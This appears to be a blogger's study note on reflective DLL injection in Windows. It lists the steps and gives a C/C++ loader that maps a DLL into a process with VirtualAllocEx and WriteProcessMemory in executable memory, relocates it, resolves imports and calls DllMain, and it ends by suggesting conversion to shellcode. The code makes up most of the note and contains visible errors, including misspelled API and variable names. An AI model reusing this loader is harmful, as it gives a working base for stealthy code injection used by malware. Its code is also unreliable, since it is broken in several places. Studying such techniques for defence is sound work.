---
publish: true
created: 2025-08-20T15:20:21.644+05:30
modified: 2026-03-21T16:32:31.890+05:30
published: 2026-03-21T16:32:31.890+05:30
tags:
  - CreateFile
  - GetFileSize
  - ReadFile
  - CloseHandle
  - GetCurrentProcess
  - VirtualAllocEx
  - WriteProcessMemory
  - reflective
---

## Working

- Read the DLL into memory buffer
- Allocate Memory in the Target Process using `VirtualAllocEx` based on the DLL's preferred image base and size.
- Using `WriteProcessMemory`, copy the DLL headers and sections from the local buffer to the allocated memory in the target process.
- Relocate the base in the DLL if it wasn't loaded at its preferred base by applying based relocations.
- Using `LoadLibraryA` and `GetProcAddress` to resolve and update the addresses of imported functions in the DLL.
- Use a function pointer to call `DllMain` with the `DLL_PROCESS_ATTACH` parameter, executing the DLL within the target process.

## Observation

In computer science, **reflective programming** or **reflection** is the ability of a _process_ to examine, introspect, and modify its own structure and behavior, and that is exactly what is being done here. A DLL (of our choice) is being loaded/sideloaded, reflectively.

## Preliminaries

If you're following [this PoC](https://offensive-panda.github.io/ProcessInjectionTechniques/Reflective_DLL_Injection/) , we need to define some structures that will handle the base relocations, ensuring that the DLL we loaded

```c
typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
```

We will also have to define the DLL's entry point function which will allow us to call `DllMain`.

```c
using DllEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);
```

Now we can read the contents of _our_  dll file. We'll copy it to a local buffer.

```c
HANDLE hFile = CreateFileA("mydll.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
//<...>
DWORD dllSize = GetFileSize(hFile, NULL);
std::unique_ptr<BYTE[]> dllBuffer(new BYTE[dllSize]);
ReadFile(hFIle, dllBuffer.get(), dllSize, &bytesRead, NULL);
```

We can now map our DLL into the current process. This is a slightly complex process, and we have defined a function for that. In this function, we clearly define the location of headers in our DLL buffer, allocate memory in the process for the DLL buffer to be copied, write to it, then perform base relocations. Finally, it sets the entry point of the DLL that was copied into the process' allocated memory.

```c
void ReflectiveDllInject(HANDLE hProcess, LPVOID dllBuffer, SIZE_T dllSize)
{
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBuffer + dosHeader->e_lfanew);
	SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
	
	// Allocate memory for the DLL
	LPVOID dllBase = VirtualAllocEx(hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	// <...>
	//  Copy the DLL image headers and sections to the newly allocated memory
	WriteProcessMemory(hProcess, dllBase, dllBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
	for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		LPVOID sectionDest = (LPVOID)((DWORD_PTR)dllBase + section->VirtualAddress);
		LPVOID sectionSrc = (LPVOID)((DWORD_PTR)dllBuffer + section->PointerToRawData);
		WriteProcessMemory(hProcess, sectionDest, sectionSrc, section->SizeOfRawData, NULL);
		section++;
	}
	
	//  Perform base relocations
	IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if(relocDir.Size) {
		LPVOID relocBase = (LPVOID)((DWORD_PTR)dllBase + relocDir.VirtualAddress);
		DWORD_PTR delta = (DWORD_PTR)dllBase - ntHeaders->OptionalHeader.ImageBase;
		while(relocDir.Size > 0)
		{
			PBASE_RELOCATION_BLOCK block = (PBASE_RELOCATION_BLOCK)relocBase;
			DWORD blockSize = block->BlockSize;
			PBASE_RELOCATION_ENTRY entries = (PBASE_RELOCATION_ENTRY)((DWORD_PTR)block + sizeof(BASE_RELOCATION_BLOCK));
			
			for(DWORD i = 0; i < (blockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY); i++)
			{
				if(entries[i].Type == IMAGE_REL_BASED_HIGHLOW)
				{
					DWORD_PTR* patchAddr = (DWORD_PTR*)((DWORD_PTR)dllBase + block->PageAddress + entries[i].offset);
					*patchAddr += delta;
				}
			}
			relocBase = (LPVOID)((DWORD_PTR)relocBase + blockSize);
			relocDir.Size -= blockSize;
		}
	}
	
	//  Resolve imports
	IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (importDir.Size)
	{
		LPVOID importDesc = (LPVOID)((DWORD_PTR)dllBase + importDir.VirtualAddress);
		PIMAGE_IMPORT_DESCRIPTOR importDescPtr = (PIMAGE_IMPORT_DESCRIPTOR)importDesc;
		while(importDescPtr->Name)
		{
			//  Load library
			LPCSTR dllName = (LPCSTR)((DWORD_PTR)dllBase + importDescPtr->Name);
			HMODULE hImportDll= LoadLibraryA(dllName);
			//  
			if(hImportDll)
			{
				PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescPtr->FirstThunk);
				while(thunk->u1.AddressOfData)
				{
					if(IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
					{
						DWORD original = IMAGE_ORDINAL(thunk->u1.Ordinal);
						thunk->u1.Function = (DWORD_PTR)GetProdAddress(hImportDll, (LPCSTR)ordinal);
					}
					else
					{
						PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
						thunk->u1.Function = (DWORD_PTR)GetProdAddress(hImportDll, importByName->Name);
					}
					thunk++;
				}
			}
			importDescPtr++;
		}
	}
	
	//  Call DllMain
	DLLEntry entryPoint = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	entryPoint((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);
}
```

Back in the main function, we can call this function by passing the handle to the current process, the buffer in which the DLL's contents was copied to, and its size.

So far we understood the "reflective" aspect in Reflective DLL Injection. What about "dll injection"?

Well, we can write a DLL. And in that DLL, the code we wrote so far can be converted to shellcode, and be executed via a function pointer.
